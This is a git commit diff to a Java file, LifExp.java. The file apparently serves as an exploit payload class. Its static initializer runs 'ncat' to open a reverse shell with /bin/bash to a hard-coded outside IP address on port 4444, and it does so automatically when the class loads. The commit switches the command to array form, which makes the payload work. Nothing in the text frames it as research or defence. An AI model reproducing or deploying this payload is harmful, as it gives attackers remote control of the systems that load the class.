9bcb088aacbc91be8f9aa9177c03cd5f9d8451a8
mathiznogoud <mathiznogoud@gmail.com>
2020-03-27 08:49:07 -0700

    update

--- LifExp.java
+++ LifExp.java
@@ -2,8 +2,8 @@ public class LifExp {
 
 static {
 try {
-//String[] cmd = {"cmd.exe", "/c", "dir"};
-String cmd = "ncat 103.130.218.210 4444 -e /bin/bash";
+String[] cmd = {"ncat", "103.130.218.210", "4444", "-e", "/bin/bash"};
+//String cmd = "ncat 103.130.218.210 4444 -e /bin/bash";
 java.lang.Runtime.getRuntime().exec(cmd).waitFor();
 } catch ( Exception e ) {
 e.printStackTrace();
